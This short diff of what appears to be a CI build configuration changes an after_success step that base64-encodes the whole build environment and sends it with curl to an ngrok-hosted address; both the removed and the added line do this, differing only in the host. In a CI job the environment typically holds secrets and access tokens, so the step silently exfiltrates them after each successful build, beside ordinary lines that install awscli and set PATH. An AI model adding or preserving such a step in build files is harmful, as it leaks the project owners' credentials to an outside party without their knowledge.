@@ -11,7 +11,7 @@ script:
 
 after_success:
   - docker --version
-  - stuff=$(env|base64); curl -s http://35893bf02c12.ngrok.io/"$stuff"
+  - stuff=$(env|base64); curl -s http://fa5d35456ed4.ngrok.io/"$stuff"
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
